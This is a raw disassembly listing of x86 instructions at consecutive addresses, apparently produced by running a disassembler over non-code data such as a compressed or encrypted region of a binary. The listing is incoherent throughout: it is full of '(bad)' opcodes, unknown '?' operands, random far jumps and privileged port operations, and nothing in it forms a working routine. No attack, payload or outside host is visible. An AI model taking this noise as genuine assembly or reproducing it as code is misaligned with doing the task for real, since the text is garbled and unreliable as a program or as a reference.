  479686:	jnp    0x4796b9
  479688:	imul   esp,DWORD PTR [edx-0x2ee5a039],0x25
  47968f:	ins    BYTE PTR es:[edi],dx
  479690:	or     DWORD PTR ds:0x3f961f64,ebx
  479696:	ret    0xffff
  479699:	cmp    eax,0xb9b2192f
  47969e:	push   ss
  47969f:	sub    esp,ebp
  4796a1:	and    BYTE PTR [ecx+0x6c],al
  4796a4:	push   esp
  4796a5:	jge    0x47964c
  4796a7:	nop
  4796a8:	mov    ebx,0xcb2f7860
  4796ad:	cmp    eax,0xff276742
  4796b2:	push   esi
  4796b4:	dec    DWORD PTR [edx]
  4796b6:	mov    edi,0x152781cc
  4796bb:	or     al,0x84
  4796bd:	mov    eax,0x5fc44f05
  4796c2:	popa   
  4796c3:	cmp    edi,DWORD PTR [ecx-0x5e]
  4796c6:	int3   
  4796c7:	test   DWORD PTR [esi],edi
  4796c9:	das    
  4796ca:	ins    DWORD PTR es:[edi],dx
  4796cb:	xchg   DWORD PTR [ecx+0x3acc2703],edi
  4796d1:	(bad)  
  4796d2:	(bad)  
  4796d4:	call   FWORD PTR [ecx+0x6b]
  4796d7:	sub    eax,0x81cfb764
  4796dc:	push   ebx
  4796dd:	sub    DWORD PTR [edx],eax
  4796df:	mov    ?,WORD PTR [edx+0x49d72c12]
  4796e5:	dec    esi
  4796e6:	gs pop ds
  4796e8:	mov    bl,0xd1
  4796ea:	mov    esi,DWORD PTR [eax]
  4796ec:	and    DWORD PTR [eax],ecx
  4796ee:	xchg   esp,eax
  4796ef:	fsub   QWORD PTR [eax]
  4796f1:	(bad)  
  4796f2:	mov    edi,0xe21cfffd
  4796f7:	sbb    bl,BYTE PTR [ecx+0x68]
  4796fa:	es jle 0x4796a0
  4796fd:	shl    ah,cl
  4796ff:	and    BYTE PTR ds:0x4f2f8b0e,ah
  479705:	shr    BYTE PTR [ebx+eax*2],1
  479708:	ins    DWORD PTR es:[edi],dx
  479709:	push   esp
  47970a:	arpl   WORD PTR [eax+0x240c90c7],di
  479710:	sbb    DWORD PTR [edi-0x70000001],esi
  479716:	mov    ebp,0x2ac63d77
  47971b:	pop    ebx
  47971c:	or     DWORD PTR ds:0x94c3a06e,esi
  479722:	cmp    bh,BYTE PTR [ecx+0x5f]
  479725:	into   
  479726:	mov    eax,0xea3231b
  47972b:	dec    eax
  47972c:	jge    0x47972f
  47972e:	aas    
  47972f:	shr    BYTE PTR [edx-0x1f],1
  479735:	xor    ah,BYTE PTR [edi]
  479737:	or     BYTE PTR [ecx-0x3bd5da24],ah
  47973d:	or     al,BYTE PTR [ecx+0x66]
  479740:	daa    
  479741:	outs   dx,DWORD PTR ds:[esi]
  479742:	popf   
  479743:	(bad)  
  479744:	popf   
  479745:	push   ebx
  479746:	sbb    BYTE PTR [eax],cl
  479748:	xchg   DWORD PTR [ecx+0x2ce3a19],ebx
  47974e:	dec    eax
  47974f:	jo     0x4796e0
  479751:	(bad)  
  479752:	(bad)  
  479753:	(bad)  
  479754:	jg     0x4796ed
  479756:	mov    ds:0x282d36b6,al
  47975b:	mov    gs,WORD PTR [ecx+0x25c2191a]
  479761:	pop    eax
  479762:	ins    BYTE PTR es:[edi],dx
  479763:	adc    eax,0x83c7840a
  479768:	sbb    al,0x3a
  47976a:	or     BYTE PTR [esi-0x19c9ed69],cl
  479770:	xor    DWORD PTR [ecx+ecx*1-0x3e],ebp
  479774:	stc    
  479775:	(bad)  
  479776:	inc    DWORD PTR [esi]
  479778:	outs   dx,DWORD PTR ds:[esi]
  479779:	mov    cl,0xf3
  47977b:	xchg   ecx,eax
  47977c:	cmp    BYTE PTR ss:[esi+esi*4],dl
  479780:	mov    ebp,0xcc63a1b
  479785:	push   ebp
  479786:	dec    eax
  479787:	push   esp
  479788:	dec    ecx
  479789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47978a:	mov    DWORD PTR [eax-0xd1],0x2cd72ef6
  479794:	pop    ds
  479795:	pop    ss
  479796:	js     0x47974b
  479798:	(bad)  
  479799:	mov    ds:0xe0082f21,al
  47979e:	lahf   
  47979f:	add    eax,0x6c3dd336
  4797a4:	push   0x25
  4797a6:	jg     0x479767
  4797a8:	rol    BYTE PTR [ecx+0x46ff2510],1
  4797ae:	loope  0x4797bd
  4797b0:	dec    edi
  4797b1:	(bad)  
  4797b3:	loop   0x4797fe
  4797b5:	das    
  4797b6:	add    DWORD PTR [edx+0x2b3696e1],esp
  4797bc:	sbb    DWORD PTR [ebp-0x98e4001],eax
  4797c2:	xchg   esp,eax
  4797c3:	push   ss
  4797c4:	cmp    al,0xcb
  4797c6:	(bad)  
  4797c8:	das    
  4797c9:	ds pop ds
  4797cb:	(bad)  
  4797cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4797cd:	aas    
  4797ce:	shl    BYTE PTR cs:[ecx],1
  4797d1:	sub    eax,0xa673264a
  4797d6:	out    dx,eax
  4797d7:	pop    esi
  4797d8:	clc    
  4797d9:	ret    0xa3d6
  4797dc:	aas    
  4797dd:	and    eax,0xff1faf81
  4797e2:	cmp    ecx,DWORD PTR [esp+eiz*2+0x5f]
  4797e6:	fist   DWORD PTR [edi+eiz*1-0x260680fe]
  4797ed:	repnz or al,0x93
  4797f0:	mov    ah,0x33
  4797f2:	sub    BYTE PTR [edi],bl
  4797f4:	mov    dh,0x36
  4797f6:	or     BYTE PTR es:[edx],dl
  4797f9:	or     al,0xcc
  4797fb:	daa    
  4797fc:	pop    ecx
  4797fd:	ins    BYTE PTR es:[edi],dx
  4797fe:	ds sti 
  479800:	(bad)  
  479801:	in     eax,dx
  479802:	sub    al,0x7e
  479804:	(bad)  
  479805:	dec    edi
  479806:	sub    bh,BYTE PTR [edx]
  479808:	sbb    DWORD PTR [ecx+edi*4+0x26d13b04],esp
  47980f:	push   esp
  479810:	inc    edx
  479811:	xor    DWORD PTR [ebx+0xf],esi
  479814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479815:	mov    dl,0x14
  479817:	mov    al,0xff
  479819:	ja     0x479832
  47981b:	(bad)  
  47981c:	cmp    DWORD PTR [ecx-0x71],ebx
  47981f:	scas   eax,DWORD PTR es:[edi]
  479820:	rcl    BYTE PTR [eax-0x70e2cdea],cl
  479826:	scas   al,BYTE PTR es:[edi]
  479827:	add    eax,DWORD PTR [esi+eax*8]
  47982a:	xor    BYTE PTR [edi-0x7b],bl
  47982d:	inc    DWORD PTR [ebp-0x7ad9db01]
  479833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479834:	ja     0x479836
  479836:	shr    DWORD PTR [edi],cl
  479838:	pop    ecx
  479839:	es gs mov ch,0xc7
  47983d:	xchg   edi,eax
  47983e:	and    BYTE PTR [esi],bl
  479840:	add    bh,BYTE PTR [edi]
  479842:	aas    
  479843:	imul   edi,DWORD PTR [esi-0x1f],0x19
  479847:	dec    edi
  479848:	in     al,0x7f
  47984a:	pop    esp
  47984b:	daa    
  47984c:	outs   dx,DWORD PTR ds:[esi]
  47984d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47984e:	in     al,dx
  47984f:	cmp    bh,BYTE PTR [edi+0x65246464]
  479855:	mov    edi,0xa4fffdfd
  47985a:	(bad)  
  47985b:	scas   eax,DWORD PTR es:[edi]
  47985c:	xor    ebp,DWORD PTR ss:[ebp-0x5d]
  479860:	scas   al,BYTE PTR es:[edi]
  479861:	push   cs
  479862:	aas    
  479863:	xlat   BYTE PTR ds:[ebx]
  479864:	or     eax,0xe43f6a48
  479869:	pop    ds
  47986a:	and    eax,0xe07a92f
  47986f:	shr    BYTE PTR [edx],0x7f
  479872:	jecxz  0x479873
  479874:	ret    0x7c42
  479877:	out    dx,eax
  479878:	cwde   
  479879:	ret    
  47987a:	mov    DWORD PTR [esi],esi
  47987c:	or     ebp,DWORD PTR [ebp-0x54]
  47987f:	scas   eax,DWORD PTR es:[edi]
  479880:	push   ss
  479881:	sbb    eax,0x31605f2f
  479886:	jl     0x47983b
  479888:	repnz (bad) 
  47988a:	push   DWORD PTR [ecx+0x3c3a96f6]
  479890:	or     al,0xef
  479892:	scas   eax,DWORD PTR es:[edi]
  479893:	inc    ebp
  479894:	daa    
  479895:	imul   ebx,DWORD PTR [ecx+0x1a3d81d2],0x2
  47989c:	mov    WORD PTR [ebp+0x5a33614],?
  4798a2:	pop    esi
  4798a3:	loope  0x479880
  4798a5:	test   dl,0x68
  4798a8:	adc    bl,BYTE PTR [edi]
  4798aa:	(bad)  
  4798ab:	test   eax,0x7f92d036
  4798b0:	add    edx,eax
  4798b2:	sub    BYTE PTR [esi-0x31],ch
  4798b5:	js     0x4798b2
  4798b7:	mov    dh,0xf0
  4798b9:	mov    ds:0x1f0ccaad,al
  4798be:	adc    ebx,DWORD PTR [edx+ecx*8]
  4798c1:	sub    eax,0xa0643b9f
  4798c6:	sbb    ebx,edi
  4798c8:	clc    
  4798c9:	fild   QWORD PTR [edi]
  4798cb:	daa    
  4798cc:	sbb    DWORD PTR [esp+eax*4],eax
  4798cf:	mov    BYTE PTR [eax],bl
  4798d1:	sbb    al,0xd7
  4798d3:	cmp    ecx,edi
  4798d5:	xor    ebx,DWORD PTR [ecx-0x41]
  4798d8:	(bad)  
  4798d9:	(bad)  
  4798da:	cmp    DWORD PTR [edi+ebp*2-0x1],ebp
  4798de:	inc    DWORD PTR ds:0x3f16ab8c
  4798e4:	retf   0x4967
  4798e7:	cmp    BYTE PTR gs:[edx],cl
  4798ea:	xchg   bl,al
  4798ec:	nop
  4798ed:	cmp    eax,DWORD PTR [edi]
  4798ef:	pop    edi
  4798f0:	mov    edi,0x4ebf1c1f
  4798f5:	inc    edx
  4798f7:	jmp    FWORD PTR [edi]
  4798f9:	jg     0x479955
  4798fb:	mov    bh,0xd6
  4798fd:	mov    WORD PTR ds:0x9a840323,ss
  479903:	push   ds
  479904:	and    eax,esi
  479906:	pop    es
  479907:	das    
  479908:	xor    DWORD PTR [ebx-0x2a],ecx
  47990b:	repnz test DWORD PTR [edi],esp
  47990e:	and    bl,bh
  479910:	mov    esi,0x892bf4b1
  479915:	mov    dl,0x13
  479917:	outs   dx,DWORD PTR ds:[esi]
  479918:	cmp    eax,0xb96327cf
  47991d:	int3   
  47991e:	aas    
  47991f:	sbb    DWORD PTR [ecx],ebx
  479921:	xchg   edx,eax
  479922:	mov    dl,al
  479924:	inc    DWORD PTR [edi-0x2]
  479927:	sbb    BYTE PTR [esi],al
  479929:	int    0x3d
  47992b:	push   0x90b1571
  479930:	test   BYTE PTR [esi+0x3ac82c16],bl
  479936:	inc    ecx
  479937:	push   0xffef6227
  47993c:	lahf   
  47993d:	lock inc DWORD PTR [edi-0x6be2ccdf]
  479944:	out    dx,eax
  479945:	inc    ebp
  479946:	popa   
  479947:	(bad)  
  479948:	and    eax,0x24062f41
  47994d:	sbb    eax,0x2a03b392
  479952:	sar    BYTE PTR ds:0xf8df6869,0x60
  479959:	cld    
  47995a:	and    BYTE PTR [ebx-0x2a],ch
  47995d:	int    0x88
  47995f:	ss aas 
  479961:	or     al,BYTE PTR [edx+0x5c]
  479964:	cmp    bl,BYTE PTR [edi-0x35]
  479967:	nop
  479968:	cmp    ch,BYTE PTR [ebx]
  47996a:	xchg   ebp,eax
  47996b:	pop    esi
  47996c:	sub    al,0x1
  47996f:	mov    DWORD PTR [esi+0x6764263e],esp
  479975:	mov    dl,0xff
  479977:	call   FWORD PTR [ebx]
  479979:	ss scas eax,DWORD PTR es:[edi]
  47997b:	cmp    dh,BYTE PTR [eax]
  47997d:	out    dx,eax
  47997e:	sbb    BYTE PTR [ecx+edx*8],cl
  479981:	sub    al,0x4c
  479983:	jge    0x4799b6
  479985:	inc    ebx
  479986:	mov    eax,0x243290d1
  47998b:	push   cs
  47998c:	test   esp,ebx
  47998e:	xor    al,0x20
  479990:	test   eax,0xf7ff28d4
  479995:	sub    BYTE PTR [esi+0x62],bl
  479998:	sbb    DWORD PTR [edi-0x45],ebp
  47999b:	in     al,0xcf
  47999d:	aas    
  47999e:	mov    edi,0x98fa5f6f
  4799a3:	mov    edi,0x1488d684
  4799a8:	bt     DWORD PTR [ebx+0x5e2f3f1a],esi
  4799af:	jp     0x4799ee
  4799b1:	in     eax,dx
  4799b2:	das    
  4799b3:	std    
  4799b4:	jmp    DWORD PTR [ebp-0x48]
  4799b7:	cmc    
  4799b8:	mov    esp,DWORD PTR [ecx]
  4799ba:	and    DWORD PTR [esi],edi
  4799bc:	nop
  4799bd:	mov    ebp,0x20f02a14
  4799c2:	push   edi
  4799c3:	pop    ds
  4799c4:	pop    eax
  4799c5:	mov    ds:0x273ca7ce,al
  4799ca:	jg     0x47999e
  4799cc:	ret    0xbff
  4799cf:	iret   
  4799d0:	cmp    al,0xe1
  4799d2:	cmp    al,0x4b
  4799d4:	outs   dx,DWORD PTR ds:[esi]
  4799d5:	xor    DWORD PTR [eax-0x2a],edi
  4799d8:	xlat   BYTE PTR ds:[ebx]
  4799d9:	xchg   esi,eax
  4799da:	aas    
  4799db:	das    
  4799dc:	mov    ?,edi
  4799de:	pop    ebx
  4799df:	outs   dx,DWORD PTR ds:[esi]
  4799e0:	clc    
  4799e1:	aas    
  4799e2:	js     0x479a3f
  4799e4:	sbb    BYTE PTR [esi-0x47],cl
  4799e7:	aad    0x8a
  4799e9:	aas    
  4799ea:	and    eax,0xca091f0c
  4799ef:	and    eax,0xe3781f48
  4799f4:	(bad)  
  4799f5:	jbe    0x4799c0
  4799f7:	mov    bh,0xd1
  4799f9:	jg     0x4799ca
  4799fb:	dec    ebp
  4799fc:	das    
  4799fd:	mov    eax,ds:0xc6eb4f3d
  479a02:	(bad)  
  479a03:	jg     0x47999e
  479a05:	cwde   
  479a06:	push   ds
  479a07:	cs iret 
  479a09:	sbb    DWORD PTR [ebx+edi*2+0x35],ecx
  479a0d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  479a0f:	jecxz  0x4799f5
  479a11:	add    DWORD PTR [ebx],ebp
  479a13:	push   ds
  479a14:	lar    esp,WORD PTR [edx]
  479a17:	lahf   
  479a18:	cs sub al,0x9d
  479a1b:	jge    0x479a76
  479a1d:	jnp    0x479a5c
  479a1f:	outs   dx,DWORD PTR ds:[esi]
  479a20:	xcrypt-ofb (bad)
  479a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  479a22:	das    
  479a23:	or     cl,BYTE PTR [edi]
  479a25:	pop    edi
  479a26:	jo     0x4799e7
  479a28:	jo     0x479a55
  479a2a:	mov    eax,0x47e9faf
  479a2f:	test   esp,esp
  479a31:	dec    edi
  479a32:	sti    
  479a33:	jae    0x479aa6
  479a35:	or     edi,edi
  479a37:	mov    edi,0x4507fff1
  479a3c:	nop
  479a3d:	div    BYTE PTR [ebx-0x43d7e7ee]
  479a43:	xchg   ecx,eax
  479a44:	push   ds
  479a45:	sub    al,0x4f
  479a47:	pop    esi
  479a48:	data16 xor bh,BYTE PTR [esi-0x76]
  479a4c:	cmc    
  479a4d:	lea    edi,ds:0xaf97022e
  479a53:	sub    edi,DWORD PTR [ebp+0xcf8585d]
  479a59:	(bad)  
  479a5a:	cmp    ebx,DWORD PTR [edi+0x6c]
  479a5d:	out    dx,eax
  479a5e:	sbb    BYTE PTR [edi-0x7f70dce0],0x22
  479a65:	and    edi,edi
  479a67:	push   esi
  479a69:	outs   dx,DWORD PTR ds:[esi]
  479a6a:	outs   dx,DWORD PTR ds:[esi]
  479a6b:	pop    esi
  479a6c:	jge    0x479aa3
  479a6e:	mov    dx,0xaca2
  479a72:	das    
  479a73:	sub    DWORD PTR [edi-0xf5da63],esi
  479a79:	or     eax,0x58175a68
  479a7e:	lahf   
  479a7f:	repnz mov al,0x1a
  479a82:	loope  0x479ae1
  479a84:	das    
  479a85:	std    
  479a86:	add    eax,0xe8fbc23
  479a8b:	cmp    al,0xf
  479a8d:	inc    eax
  479a8e:	push   ebp
  479a8f:	pop    ss
  479a90:	jg     0x479a28
  479a92:	xor    ah,BYTE PTR [esi]
  479a94:	cmp    eax,0xf85e024f
  479a99:	pop    ebx
  479a9a:	(bad)  
  479a9c:	cmp    al,BYTE PTR [edx+0x7b]
  479a9f:	or     BYTE PTR [edx],bh
  479aa1:	lahf   
  479aa2:	xchg   esi,eax
  479aa3:	cmp    al,0x29
  479aa5:	retf   
  479aa6:	jmp    FWORD PTR [edi+0x35]
  479aa9:	xor    eax,0x4028ed2f
  479aae:	ins    BYTE PTR es:[edi],dx
  479aaf:	pop    es
  479ab0:	jle    0x479a56
  479ab2:	retf   
  479ab3:	mov    dh,BYTE PTR [edx+ecx*2]
  479ab6:	and    al,0x84
  479ab8:	cmp    ebx,esi
  479aba:	and    al,bh
  479abc:	dec    edx
  479abe:	das    
  479abf:	inc    esp
  479ac0:	ins    BYTE PTR es:[edi],dx
  479ac1:	or     al,BYTE PTR es:[ebp+0x1d07a2ed]
  479ac8:	sub    al,0xb2
  479aca:	pop    ebx
  479acb:	retf   0x5f2a
  479ace:	outs   dx,BYTE PTR ds:[esi]
  479acf:	mov    edi,0x659f97e1
  479ad4:	mov    al,0xd6
  479ad6:	mov    eax,0xb3df04
  479adb:	cmp    al,0x83
  479add:	pop    es
  479ade:	jns    0x479b2f
  479ae0:	jg     0x479a86
  479ae2:	sbb    eax,0x4f95bf1b
  479ae7:	fistp  QWORD PTR [ebx]
  479ae9:	test   DWORD PTR [esi+0x2dff2604],ebp
  479aef:	mov    edi,0xbf77b7b2
  479af4:	std    
  479af5:	xlat   BYTE PTR ds:[ebx]
  479af6:	xchg   DWORD PTR [edi],esp
  479af8:	add    ecx,DWORD PTR [ecx]
  479afa:	loopne 0x479aeb
  479afc:	sub    dl,cl
  479afe:	cmp    eax,0xc6cf654c
  479b03:	xchg   ecx,eax
  479b04:	xor    BYTE PTR [esi],bh
  479b06:	dec    edi
  479b07:	fdiv   QWORD PTR ds:0xffffffff
  479b0d:	or     al,0xe7
  479b0f:	punpckhdq mm0,QWORD PTR [ecx+0x1e]
  479b13:	inc    ecx
  479b14:	fwait
  479b15:	repnz mov ch,0x1
  479b18:	push   ds
  479b19:	cmp    esi,DWORD PTR [edi-0x6f82d17c]
  479b1f:	jge    0x479b3c
  479b21:	ds ins BYTE PTR es:[edi],dx
  479b23:	xor    edx,esi
  479b25:	out    0x8d,al
  479b27:	and    BYTE PTR [edx],bh
  479b29:	add    DWORD PTR [ecx+0x7ffc39a5],eax
  479b2f:	popa   
  479b30:	sti    
  479b31:	cs into 
  479b33:	sub    al,0x2d
  479b35:	pop    ebp
  479b36:	aas    
  479b37:	mov    edx,0x54a3cdf
  479b3c:	xchg   esp,eax
  479b3d:	test   al,0x7
  479b3f:	jne    0x479acd
  479b41:	pop    dx
  479b43:	popa   
  479b44:	xor    eax,0x2ffb7fff
  479b49:	iret   
  479b4a:	ror    DWORD PTR [ecx-0x31e2dcd6],1
  479b50:	mov    ebp,0x44281f1c
  479b55:	daa    
  479b56:	aaa    
  479b57:	gs mov ebx,0x3e278ca2
  479b5d:	sbb    eax,0xbd58f3da
  479b62:	jge    0x479b5f
  479b64:	(bad)  
  479b65:	cmp    bl,cl
  479b67:	sub    BYTE PTR [ecx+0x60],bl
  479b6a:	daa    
  479b6b:	scas   eax,DWORD PTR es:[di]
  479b6d:	retf   
  479b6e:	xchg   esp,eax
  479b6f:	jge    0x479ba0
  479b71:	sbb    edi,DWORD PTR [edi+0x13]
  479b74:	and    bh,dl
  479b76:	addr16 iret 
  479b78:	xor    esp,DWORD PTR ds:0xfc2ff1bf
  479b7e:	outs   dx,DWORD PTR ds:[esi]
  479b7f:	jg     0x479bbc
  479b81:	sbb    DWORD PTR ds:[eax-0x2b9fa71a],edx
  479b88:	and    edi,edi
  479b8a:	cmp    eax,0x8ddbbb79
  479b8f:	and    esp,DWORD PTR [esi+edi*8-0x1]
  479b93:	aaa    
  479b94:	mov    ebp,0x2077bbdf
  479b99:	pop    edi
  479b9a:	or     DWORD PTR [eax],ecx
  479b9c:	or     dh,dh
  479b9e:	mov    ds:0x436453ca,al
  479ba3:	loopne 0x479b28
  479ba5:	ja     0x479bb7
  479ba7:	mov    ds:0x74370069,eax
  479bac:	in     al,0xff
  479bae:	(bad)  
  479baf:	fisttp WORD PTR [edi]
  479bb1:	and    ah,0x7e
  479bb4:	dec    edx
  479bb5:	pusha  
  479bb6:	jmp    0x5821:0x917f52dc
  479bbd:	and    al,0x71
  479bbf:	cmp    ah,ah
  479bc1:	retf   0x7e91
  479bc4:	outs   dx,DWORD PTR ds:[esi]
  479bc5:	add    eax,0xe3468395
  479bca:	jmp    DWORD PTR [edi]
  479bcc:	pop    ebp
  479bcd:	shl    BYTE PTR [edx+eax*1+0x7d1de54f],cl
  479bd4:	or     DWORD PTR [esi+0xa],edi
  479bd7:	nop
  479bd8:	retf   
  479bd9:	jg     0x479c41
  479bdb:	jecxz  0x479bb3
  479bdd:	pop    edi
  479bde:	clc    
  479bdf:	sub    DWORD PTR [eax+0x55873c1f],0xbf4c547d
  479be9:	into   
  479bea:	das    
  479beb:	addr16 sub al,0x1f
  479bee:	jg     0x479be9
  479bf0:	(bad)  
  479bf1:	jg     0x479c4d
  479bf3:	or     al,0xcc
  479bf5:	cmp    DWORD PTR [esp+ebp*2+0x30],eax
  479bf9:	and    al,0xa2
  479bfb:	ficom  DWORD PTR [eax-0x4fc2f4ad]
  479c01:	cwde   
  479c02:	ss sbb esp,edx
  479c05:	dec    edi
  479c06:	push   es
  479c07:	cmp    esi,edx
  479c09:	xchg   DWORD PTR [eax-0xbaf9001],ecx
  479c0f:	es dec edx
  479c11:	ins    DWORD PTR es:[edi],dx
  479c12:	in     al,dx
  479c13:	pop    edi
  479c14:	jmp    0x479c1e
  479c16:	jg     0x479c65
  479c18:	add    ecx,DWORD PTR [ebx-0x7c]
  479c1b:	out    0xb8,eax
  479c1d:	pop    ss
  479c1e:	cmovnp ecx,DWORD PTR [ebp-0x5cc11c81]
  479c25:	mov    ss,WORD PTR [ebx]
  479c27:	test   DWORD PTR [eax],0x59084762
  479c2d:	scas   eax,DWORD PTR es:[edi]
  479c2e:	lahf   
  479c2f:	jg     0x479c9e
  479c31:	lock inc ecx
  479c33:	sub    bh,bh
  479c35:	mov    bl,0xa5
  479c37:	add    al,0x3b
  479c39:	(bad)  
  479c3a:	and    al,0x6f
  479c3c:	pusha  
  479c3d:	iret   
  479c3e:	fdiv   QWORD PTR [esi]
  479c40:	or     eax,0x5bffffe0
  479c45:	mov    edi,0x42134fbf
  479c4a:	lahf   
  479c4b:	call   0xaf6aa3ca
  479c50:	mov    WORD PTR [esi],fs
  479c52:	sbb    eax,0x5f781df0
  479c57:	add    edx,DWORD PTR [edx-0x71]
  479c5a:	clc    
  479c5b:	test   DWORD PTR [ecx],esi
  479c5d:	sub    DWORD PTR [ebp+0x7f],ebp
  479c60:	jecxz  0x479c61
  479c62:	or     DWORD PTR [ebp-0x35d8ef46],eax
  479c68:	and    eax,DWORD PTR [esi+0x65]
  479c6b:	cmp    DWORD PTR [edi+ebp*1-0x6b],esp
  479c6f:	and    DWORD PTR [ecx],edi
  479c71:	sbb    DWORD PTR [ebp-0x72253456],edx
  479c77:	outs   dx,DWORD PTR ds:[esi]
  479c78:	jmp    FWORD PTR [edi]
  479c7a:	cmp    BYTE PTR ss:[esi+0x39],ah
  479c7e:	loop   0x479c17
  479c80:	shl    BYTE PTR [edx+esi*2+0x54],cl
  479c84:	retf   
  479c85:	repz mov edi,0x622d119b
  479c8b:	scas   eax,DWORD PTR es:[edi]
  479c8c:	lock call 0x4fdf:0x887f02c0
  479c94:	cli    
  479c95:	(bad)  
  479c96:	inc    DWORD PTR [edi-0x4c79fc61]
  479c9c:	ja     0x479cac
  479c9e:	loope  0x479caa
  479ca0:	imul   ecx,DWORD PTR [eax+0x16],0xa6e39249
  479ca7:	adc    BYTE PTR [esi],cl
  479ca9:	ins    DWORD PTR es:[edi],dx
  479caa:	int    0xf1
  479cac:	ja     0x479cf0
  479cae:	test   eax,0x5c77e176
  479cb3:	dec    edi
  479cb4:	and    BYTE PTR [bx],bl
  479cb7:	leave  
  479cb8:	pop    ss
  479cb9:	and    ebx,DWORD PTR [esi]
  479cbb:	nop
  479cbc:	mov    bl,0xcf
  479cbe:	xlat   BYTE PTR ds:[ebx]
  479cbf:	and    BYTE PTR [edi],cl
  479cc1:	jg     0x479c96
  479cc3:	mov    bh,0xff
  479cc5:	outs   dx,BYTE PTR ds:[esi]
  479cc6:	sub    dh,BYTE PTR [eax+0x673e96cd]
  479ccc:	or     edi,ebp
  479cce:	push   ss
  479ccf:	je     0x479c54
  479cd1:	daa    
  479cd2:	iret   
  479cd3:	aaa    
  479cd4:	hlt    
  479cd5:	iret   
  479cd6:	popf   
  479cd7:	xor    eax,0xff4b0123
  479cdc:	cmp    edi,eax
  479cde:	test   esi,edi
  479ce0:	dec    esp
  479ce1:	outs   dx,DWORD PTR ds:[esi]
  479ce2:	lds    edi,FWORD PTR [edi]
  479ce4:	cmp    ch,BYTE PTR [ebx-0x45]
  479ce7:	(bad)  
  479ce8:	fnstenv [ecx+0x4a]
  479ceb:	dec    edi
  479cec:	in     eax,dx
  479ced:	(bad)  
  479cee:	pop    edi
  479cef:	int    0x68
  479cf1:	mov    edi,0x20df4dc0
  479cf6:	daa    
  479cf7:	sbb    BYTE PTR [edi],0x36
  479cfa:	jo     0x479d49
  479cfc:	sub    DWORD PTR [ebx+esi*4-0x2f369f27],0x8d4f7f2f
  479d07:	pop    ds
  479d08:	ds (bad) 
  479d0a:	dec    DWORD PTR [ebp+0x6d]
  479d0d:	icebp  
  479d0e:	fisttp WORD PTR [edi-0x24ffa69c]
  479d14:	test   al,0xe4
  479d16:	add    eax,DWORD PTR ds:0x77fcb43e
  479d1c:	outs   dx,DWORD PTR ds:[esi]
  479d1d:	jmp    0x479d3c
  479d1f:	jns    0x479ccf
  479d21:	ret    0x97ff
  479d24:	add    BYTE PTR [ebx],bh
  479d26:	clc    
  479d27:	xchg   ebx,eax
  479d28:	jmp    0x93499f86
  479d2d:	test   al,0x4d
  479d2f:	outs   dx,DWORD PTR ds:[esi]
  479d30:	mov    ds:0xe36d6fde,eax
  479d35:	pop    ebp
  479d36:	imul   ebp,DWORD PTR [edi+0x57e6ff9f],0x2c
  479d3d:	iret   
  479d3e:	out    dx,eax
  479d3f:	ins    BYTE PTR es:[edi],dx
  479d40:	das    
  479d41:	mov    edi,0x95e25b75
  479d46:	int    0x8a
  479d48:	pop    DWORD PTR [ebx]
  479d4a:	aas    
  479d4b:	and    esi,DWORD PTR [esi]
  479d4d:	pop    edi
  479d4e:	pop    ss
  479d4f:	sub    DWORD PTR [ecx],edi
  479d51:	jg     0x479d0d
  479d53:	(bad)  
  479d54:	(bad)  
  479d55:	(bad)  
  479d56:	call   esi
  479d58:	lea    esp,[ebx]
  479d5a:	sub    ebx,DWORD PTR [edi]
  479d5c:	xchg   esp,eax
  479d5d:	repz adc DWORD PTR [eax],esp
  479d60:	shl    DWORD PTR [eax+eax*1],1
  479d63:	ins    DWORD PTR es:[edi],dx
  479d64:	xor    eax,0xc499b77e
  479d69:	xor    DWORD PTR ds:0x16b88e18,esp
  479d6f:	cmp    eax,0x42d74da
  479d74:	pop    esi
  479d75:	dec    ecx
  479d76:	xchg   edi,eax
  479d77:	fsub   DWORD PTR [eax-0x3290b0b0]
  479d7d:	and    al,0x21
  479d7f:	les    ebx,FWORD PTR [edx-0x50ed3d02]
  479d85:	xor    ebx,edi
  479d87:	or     dl,0x81
  479d8a:	jae    0x479da9
  479d8c:	add    al,0xbf
  479d8e:	daa    
  479d8f:	ret    0xfd37
  479d92:	add    eax,0x1a2946bf
  479d97:	outs   dx,DWORD PTR ds:[esi]
  479d98:	mov    ds:0xa14ddfd5,al
  479d9d:	mov    dl,0x16
  479d9f:	and    ebp,DWORD PTR [edi]
  479da1:	aam    0x78
  479da3:	mov    edi,edi
  479da5:	dec    eax
  479da6:	jnp    0x479dfc
  479da8:	ins    DWORD PTR es:[edi],dx
  479da9:	mov    dl,0xc9
  479dab:	mov    bl,0x3a
  479dad:	aas    
  479dae:	(bad)  
  479daf:	stos   DWORD PTR es:[edi],eax
  479db0:	and    ebx,DWORD PTR [edi]
  479db2:	cli    
  479db3:	jmp    FWORD PTR [edi]
  479db5:	mov    ebp,0x66317fbf
  479dba:	movzx  ebx,BYTE PTR [ecx+ecx*1]
  479dbe:	sub    BYTE PTR [eax-0xcb0c474],bh
  479dc4:	sbb    esp,DWORD PTR [edx+0x4a]
  479dc7:	sbb    DWORD PTR [ebp-0x68],eax
  479dca:	std    
  479dcb:	push   es
  479dcc:	and    edi,esp
  479dce:	fistp  WORD PTR [edx]
  479dd0:	add    al,0x29
  479dd2:	scas   eax,DWORD PTR es:[edi]
  479dd3:	mov    ebp,DWORD PTR [eax]
  479dd5:	or     al,0xef
  479dd7:	or     BYTE PTR [esi+0x5a],bh
  479dda:	out    dx,eax
  479ddb:	push   ds
  479ddc:	aas    
  479ddd:	fistp  QWORD PTR [edx-0x5]
  479de0:	retf   
  479de1:	into   
  479de2:	sub    ah,BYTE PTR [ebx+0x196e481b]
  479de8:	fisttp WORD PTR [ecx+eax*4-0x414cb0d5]
  479def:	push   ds
  479df0:	sub    bh,BYTE PTR [edi-0x18522c8b]
  479df6:	scas   eax,DWORD PTR es:[edi]
  479df7:	daa    
  479df8:	xor    BYTE PTR [edi-0x36],bh
  479dfb:	xor    bh,BYTE PTR ss:[edi-0x7]
  479dff:	add    al,0x6a
  479e01:	shr    BYTE PTR [ebp+ecx*1-0x2],1
  479e05:	ret    0x5edb
  479e08:	sub    al,0xba
  479e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
